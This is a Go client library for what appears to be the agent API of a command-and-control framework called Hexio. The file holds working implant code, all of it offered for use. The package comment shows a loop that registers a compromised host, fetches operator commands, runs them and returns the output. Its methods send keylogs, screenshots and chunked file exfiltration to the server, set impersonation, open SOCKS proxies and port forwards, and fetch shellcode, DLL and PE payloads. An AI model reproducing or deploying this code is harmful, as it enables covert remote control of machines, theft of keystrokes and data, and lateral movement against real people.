// Package hexiosdk provides a Go client for the Hexio External Agent REST API.
//
// Usage:
//
//	client := hexiosdk.NewClient("http://10.0.0.1:9000", "my-passphrase")
//	reg, err := client.Register(hexiosdk.RegisterRequest{
//	    Hostname:   "WORKSTATION",
//	    Ip:         "10.0.0.50",
//	    User:       "admin",
//	    Os:         "Windows 10",
//	    Process:    "myagent.exe",
//	    Pid:        1234,
//	    ClientType: "my_agent",
//	    SleepTime:  5,
//	})
//	// reg.Token is now set, all subsequent calls are authenticated
//
//	for {
//	    checkin, _ := client.Checkin()
//	    for _, cmd := range checkin.Commands {
//	        output := executeLocally(cmd.Command)
//	        client.CommandResponse(cmd.Id, cmd.Command, output)
//	    }
//	    time.Sleep(5 * time.Second)
//	}
package hexiosdk

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"
)

type Client struct {
	BaseURL    string
	Passphrase string
	Token      string
	AgentID    int64
	HTTPClient *http.Client
}

func NewClient(baseURL string, passphrase string) *Client {
	return &Client{
		BaseURL:    baseURL,
		Passphrase: passphrase,
		HTTPClient: &http.Client{Timeout: 30 * time.Second},
	}
}

func (c *Client) do(method, path string, body any) ([]byte, error) {
	var reqBody io.Reader
	if body != nil {
		data, err := json.Marshal(body)
		if err != nil {
			return nil, fmt.Errorf("marshal request: %w", err)
		}
		reqBody = bytes.NewReader(data)
	}

	req, err := http.NewRequest(method, c.BaseURL+path, reqBody)
	if err != nil {
		return nil, fmt.Errorf("create request: %w", err)
	}

	req.Header.Set("HexioExternalAgentAuth", c.Passphrase)
	if c.Token != "" {
		req.Header.Set("HexioAgentToken", c.Token)
	}
	if body != nil {
		req.Header.Set("Content-Type", "application/json")
	}

	resp, err := c.HTTPClient.Do(req)
	if err != nil {
		return nil, fmt.Errorf("http request: %w", err)
	}
	defer resp.Body.Close()

	respBody, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("read response: %w", err)
	}

	if resp.StatusCode >= 400 {
		var errResp struct {
			Error string `json:"error"`
		}
		json.Unmarshal(respBody, &errResp)
		return nil, fmt.Errorf("api error (%d): %s", resp.StatusCode, errResp.Error)
	}

	return respBody, nil
}

// --- Request/Response Types ---

type RegisterRequest struct {
	Hostname   string `json:"hostname"`
	Ip         string `json:"ip"`
	User       string `json:"user"`
	Os         string `json:"os"`
	Process    string `json:"process"`
	Pid        int64  `json:"pid"`
	ClientType string `json:"client_type"`
	SleepTime  int64  `json:"sleep_time"`
	Arch       string `json:"arch"`
}

type RegisterResponse struct {
	AgentID int64  `json:"agent_id"`
	Token   string `json:"token"`
}

type Command struct {
	Id      int64  `json:"id"`
	Command string `json:"command"`
}

type CheckinResponse struct {
	Commands []Command `json:"commands"`
	Files    []any     `json:"files,omitempty"`
}

type DownloadInitRequest struct {
	FileName    string `json:"file_name"`
	AgentPath   string `json:"agent_path"`
	FileSize    int    `json:"file_size"`
	ChunkSize   int    `json:"chunk_size"`
	TotalChunks int    `json:"total_chunks"`
}

type DownloadInitResponse struct {
	DownloadId string `json:"download_id"`
	AgentPath  string `json:"agent_path"`
}

type FileRequestPayload struct {
	BofFiles       []string `json:"bof_files,omitempty"`
	PeFiles        []string `json:"pe_files,omitempty"`
	DllFiles       []string `json:"dll_files,omitempty"`
	ElfFiles       []string `json:"elf_files,omitempty"`
	MachoFiles     []string `json:"macho_files,omitempty"`
	ShellcodeFiles []string `json:"shellcode_files,omitempty"`
	HexlangFiles   []string `json:"hexlang,omitempty"`
}

type FileRequestResponse struct {
	BofFiles       map[string]string `json:"bof_files,omitempty"`
	PeFiles        map[string]string `json:"pe_files,omitempty"`
	DllFiles       map[string]string `json:"dll_files,omitempty"`
	ElfFiles       map[string]string `json:"elf_files,omitempty"`
	MachoFiles     map[string]string `json:"macho_files,omitempty"`
	ShellcodeFiles map[string]string `json:"shellcode_files,omitempty"`
	Hexlang        map[string]string `json:"hexlang,omitempty"`
}

// --- API Methods ---

func (c *Client) Register(req RegisterRequest) (*RegisterResponse, error) {
	data, err := c.do("POST", "/register", req)
	if err != nil {
		return nil, err
	}
	var resp RegisterResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, err
	}
	c.Token = resp.Token
	c.AgentID = resp.AgentID
	return &resp, nil
}

func (c *Client) Checkin() (*CheckinResponse, error) {
	data, err := c.do("GET", "/agent/checkin", nil)
	if err != nil {
		return nil, err
	}
	var resp CheckinResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

func (c *Client) Sync(sleepTime *int64, sleepJitter *int64) (*CheckinResponse, error) {
	payload := make(map[string]any)
	if sleepTime != nil {
		sleep := map[string]any{"sleep_time": *sleepTime}
		if sleepJitter != nil {
			sleep["sleep_jitter"] = *sleepJitter
		}
		payload["sleep"] = sleep
	}

	var body any
	if len(payload) > 0 {
		body = payload
	}

	data, err := c.do("POST", "/agent/sync", body)
	if err != nil {
		return nil, err
	}
	var resp CheckinResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

func (c *Client) CommandResponse(commandId int64, command string, response string) error {
	_, err := c.do("POST", "/agent/command/response", map[string]any{
		"command_id": commandId,
		"command":    command,
		"response":   response,
	})
	return err
}

func (c *Client) DownloadInit(req DownloadInitRequest) (*DownloadInitResponse, error) {
	data, err := c.do("POST", "/agent/download/init", req)
	if err != nil {
		return nil, err
	}
	var resp DownloadInitResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

func (c *Client) DownloadChunk(downloadId string, chunkDataB64 string) (string, error) {
	data, err := c.do("POST", "/agent/download/chunk", map[string]string{
		"download_id": downloadId,
		"chunk_data":  chunkDataB64,
	})
	if err != nil {
		return "", err
	}
	var resp struct {
		Status string `json:"status"`
	}
	json.Unmarshal(data, &resp)
	return resp.Status, nil
}

func (c *Client) DownloadCancel(downloadId string) error {
	_, err := c.do("POST", "/agent/download/cancel", map[string]string{
		"download_id": downloadId,
	})
	return err
}

func (c *Client) Screenshot(filename string, dataB64 string) error {
	_, err := c.do("POST", "/agent/screenshot", map[string]string{
		"filename": filename,
		"data":     dataB64,
	})
	return err
}

func (c *Client) Keylog(filename string, data string) error {
	_, err := c.do("POST", "/agent/keylog", map[string]string{
		"filename": filename,
		"data":     data,
	})
	return err
}

func (c *Client) SetImpersonation(user string) error {
	_, err := c.do("POST", "/agent/impersonation", map[string]string{
		"user": user,
	})
	return err
}

func (c *Client) ClearImpersonation() error {
	return c.SetImpersonation("")
}

func (c *Client) Sidechannel(channelId string, dataB64 string) error {
	_, err := c.do("POST", "/agent/sidechannel", map[string]string{
		"channel_id": channelId,
		"data":       dataB64,
	})
	return err
}

func (c *Client) RequestFiles(req FileRequestPayload) (*FileRequestResponse, error) {
	data, err := c.do("POST", "/agent/files/request", req)
	if err != nil {
		return nil, err
	}
	var resp FileRequestResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

func (c *Client) SocksOpen(port *int64) (int64, error) {
	payload := map[string]any{}
	if port != nil {
		payload["port"] = *port
	}
	data, err := c.do("POST", "/agent/socks/open", payload)
	if err != nil {
		return 0, err
	}
	var resp struct {
		Port int64 `json:"port"`
	}
	json.Unmarshal(data, &resp)
	return resp.Port, nil
}

func (c *Client) SocksClose() error {
	_, err := c.do("POST", "/agent/socks/close", nil)
	return err
}

func (c *Client) SocksSync(payload any) (json.RawMessage, error) {
	data, err := c.do("POST", "/agent/socks/sync", payload)
	if err != nil {
		return nil, err
	}
	return json.RawMessage(data), nil
}

func (c *Client) PortFwdOpen(port int64, remoteHost string, remotePort int64) error {
	_, err := c.do("POST", "/agent/portfwd/open", map[string]any{
		"port":        port,
		"remote_host": remoteHost,
		"remote_port": remotePort,
	})
	return err
}

func (c *Client) PortFwdClose(port int64) error {
	_, err := c.do("POST", "/agent/portfwd/close", map[string]any{
		"port": port,
	})
	return err
}

func (c *Client) PortFwdSync(payload any) (json.RawMessage, error) {
	data, err := c.do("POST", "/agent/portfwd/sync", payload)
	if err != nil {
		return nil, err
	}
	return json.RawMessage(data), nil
}
